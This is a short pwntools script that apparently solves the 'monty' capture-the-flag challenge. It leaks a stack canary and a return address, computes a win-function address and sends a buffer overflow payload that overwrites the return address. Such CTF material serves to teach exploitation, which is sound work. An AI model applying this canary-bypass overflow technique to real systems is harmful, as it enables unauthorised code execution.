from pwn import *

print(args)

if args.REMOTE:
    r = remote('localhost', 5000)
    # r = remote("chall.lac.tf", 31132) # Domain during CTF
else:
    r = process("./docker/monty")

# Leaking the canary
r.sendlineafter(b'first peek? ', b'55')
r.recvuntil(b'Peek 1: ')
canary = int(r.recvline()[:-1]).to_bytes(8, 'little')

# Leaking the return address of game()
r.sendlineafter(b'second peek? ', b'57')
r.recvuntil(b'Peek 2: ')
retaddr_game = int(r.recvline()[:-1])

# Calculate winaddr
winaddr = (retaddr_game - 1093).to_bytes(8, 'little')

# Complete game
r.sendlineafter(b'lady! ', b'1') # Random index, doesn't matter
r.recvuntil(b'Name: ')

# Generating and Delivering the Payload
payload = b'A'*24 + canary + b'A'*8 + winaddr
r.sendline(payload)

r.interactive()